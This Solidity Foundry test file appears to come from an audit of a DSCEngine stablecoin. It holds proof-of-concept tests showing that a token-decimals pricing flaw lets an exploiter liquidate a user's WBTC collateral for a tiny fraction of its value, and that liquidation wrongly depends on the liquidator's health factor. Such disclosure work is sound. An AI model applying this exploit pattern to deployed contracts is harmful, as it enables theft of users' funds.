// SPDX-License-Identifier: MIT

pragma solidity ^0.8.18;

import {Test, console} from "forge-std/Test.sol";
import {DSCEngine} from "../../src/DSCEngine.sol";
import {DeployDSCForExploit} from "../../script/DeployDSCForExploit.s.sol";
import {HelperConfigForExploit} from "../../script/HelperConfigForExploit.s.sol";
import {MockV3Aggregator} from "../mocks/MockV3Aggregator.sol";
import {ERC20Mock} from "@openzeppelin/contracts/mocks/token/ERC20Mock.sol";
import {ERC20DecimalsMock} from "@openzeppelin/contracts/mocks/token/ERC20DecimalsMock.sol";
import {DecentralizedStableCoin} from "../../src/DecentralizedStableCoin.sol";

contract ExploitEngine is Test {

    DSCEngine engine;
    DecentralizedStableCoin dsc;

    DeployDSCForExploit deployer;
    HelperConfigForExploit config;

    address weth;
    address wethUsdPriceFeed;
    address wbtc;
    address wbtcUsdPriceFeed;

    uint256 wethDecimals; // 8
    uint256 wbtcDecimals; // 8

    address alice = makeAddr("alice");
    address exploiter = makeAddr("exploiter");

    uint256 private constant PRECISION = 1e18;
    uint256 private constant FEED_DECIMALS = 1e8;
    uint256 public constant LIQUIDATION_BONUS = 10;
    uint256 private constant MIN_HEALTH_FACTOR = 1e18;
    uint256 private constant LIQUIDATION_THRESHOLD = 50; // 200% overcollateralized
    uint256 private constant LIQUIDATION_PRECISION = 100;
    uint256 private constant ADDITIONAL_FEED_PRECISION = 1e10;  

    uint256 constant STARTING_ERC20_BALANCE = 10 ether;
    uint256 constant AMOUNT_COLLATERAL = 10 ether;

    function setUp() public {
        deployer = new DeployDSCForExploit();
        (dsc, engine, config) = deployer.run();
        (wethUsdPriceFeed,wbtcUsdPriceFeed,weth,wbtc,) = config.activeNetwork();
        ERC20DecimalsMock(weth).mint(alice, STARTING_ERC20_BALANCE);
        ERC20DecimalsMock(wbtc).mint(alice, STARTING_ERC20_BALANCE);

        ERC20DecimalsMock(weth).mint(exploiter, STARTING_ERC20_BALANCE);

        wethDecimals = ERC20DecimalsMock(weth).decimals();
        wbtcDecimals = ERC20DecimalsMock(wbtc).decimals();

    }

    function testExploitTokenDecimals() public {
        vm.startPrank(alice);
        uint256 amountToDeposit = 1e18; // 1 WETH
        uint256 expectedValueWeth = 2000 ether;
        uint256 amountDscFromWeth = (expectedValueWeth * LIQUIDATION_THRESHOLD) / LIQUIDATION_PRECISION;
        ERC20DecimalsMock(weth).approve(address(engine), amountToDeposit);
        engine.depositCollateralAndMintDsc(weth, amountToDeposit, amountDscFromWeth); 
        // console.log(amountDscFromWeth);
        assertEq(dsc.balanceOf(alice), amountDscFromWeth);
        vm.stopPrank();

        uint256 tokenAmount = engine.getTokenAmountFromUsd(weth, expectedValueWeth);
        assertEq(tokenAmount, amountToDeposit);

        vm.startPrank(alice);
        uint256 wbtcAmountToDeposit = 1 * 10 ** wbtcDecimals;
        uint256 expectedValueWbtc = 30000 * 10 ** wbtcDecimals;
        uint256 amountDscFromWbtc = (expectedValueWbtc * LIQUIDATION_THRESHOLD) / LIQUIDATION_PRECISION;
        ERC20DecimalsMock(wbtc).approve(address(engine), wbtcAmountToDeposit);

        engine.depositCollateralAndMintDsc(wbtc, wbtcAmountToDeposit, amountDscFromWbtc);

        assertEq(dsc.balanceOf(alice), amountDscFromWeth + amountDscFromWbtc);

        vm.stopPrank();

        uint256 amountWbtc = engine.getTokenAmountFromUsd(wbtc, expectedValueWbtc);
        assertEq(amountWbtc, wbtcAmountToDeposit);


        vm.startPrank(exploiter);
        ERC20DecimalsMock(weth).approve(address(engine), amountToDeposit);
        engine.depositCollateralAndMintDsc(weth, amountToDeposit, amountDscFromWeth);

        assertEq(dsc.balanceOf(exploiter), amountDscFromWeth);
        vm.stopPrank();

        /**
         * @dev Over time, price of wbtc falls
         */
        MockV3Aggregator(wbtcUsdPriceFeed).updateAnswer(int256(29999e8));

        uint256 newValueBtc = engine.getUsdValue(wbtc, wbtcAmountToDeposit);
        assert(engine.getHealthFactor(alice) < MIN_HEALTH_FACTOR);

        // exploiter liquidates alice
        // The amount is actually far too low given the flawed price calculation.
        // After this, the exploiter still has plenty of DSC and all of the user's WBTC.
        // The exploiter paid ~$0.0000027 for ~$30,000 worth of WBTC.
        vm.startPrank(exploiter);
        
        uint256 debtToPay = (newValueBtc * LIQUIDATION_PRECISION) / (LIQUIDATION_PRECISION + LIQUIDATION_BONUS);
        dsc.approve(address(engine), debtToPay);
        engine.liquidate(wbtc, alice, debtToPay);
        
        vm.stopPrank();

        // Exploiter has all of the WBTC and still lots of DSC left!
        uint256 err = 0.0001 ether; // 0.01% allowable relative error to account for rounding
        assertApproxEqRel(ERC20DecimalsMock(wbtc).balanceOf(exploiter), amountToDeposit, err);
        assertApproxEqRel(dsc.balanceOf(exploiter), amountDscFromWeth, err);

        // User has no WBTC left in the `DSCEngine`.
        assertApproxEqAbs(engine.getTotalCollateralValueOfUser(alice, wbtc), 0, 1); // 1 wei of allowable error for rounding


    }

    function testLiquidateRevertsIfLiquidatorHFBelow1 () public {
        vm.startPrank(alice);
        ERC20DecimalsMock(weth).approve(address(engine), AMOUNT_COLLATERAL);
        uint256 amountToMint = 100 ether; 
        engine.depositCollateralAndMintDsc(weth, AMOUNT_COLLATERAL, amountToMint);
        vm.stopPrank();

        address liquidator = makeAddr("liquidator");
        ERC20DecimalsMock(weth).mint(liquidator, STARTING_ERC20_BALANCE);

        vm.startPrank(liquidator);
        ERC20DecimalsMock(weth).approve(address(engine), AMOUNT_COLLATERAL);
        engine.depositCollateralAndMintDsc(weth, AMOUNT_COLLATERAL, amountToMint);
        vm.stopPrank();

        int256 newEthPrice = 18e8;
        MockV3Aggregator(wethUsdPriceFeed).updateAnswer(newEthPrice);
        assertLt(engine.getHealthFactor(alice), 1e18);
        assertLt(engine.getHealthFactor(liquidator), 1e18);

        vm.startPrank(liquidator);
        dsc.approve(address(engine), 1 ether);


        /**
         * @dev This reverts since liquidator's health factor is below 1.
         */
        vm.expectRevert();
        engine.liquidate(weth, alice, 1 ether);

        vm.stopPrank();

        vm.startPrank(liquidator);
        ERC20DecimalsMock(weth).mint(liquidator, 1000 ether);
        ERC20DecimalsMock(weth).approve(address(engine), 1000 ether);

        engine.depositCollateral(weth, 1000 ether);

        uint256 healthFactorBefore = engine.getHealthFactor(liquidator);
        assertGe(healthFactorBefore, 1e18);


        /**
         * @dev This shows that liquidate doesn't affect liquidator's HF
         */
        dsc.approve(address(engine), 1 ether);
        engine.liquidate(weth, alice, 1 ether);

        assertEq(healthFactorBefore, engine.getHealthFactor(liquidator));

        vm.stopPrank();
        
    }
}
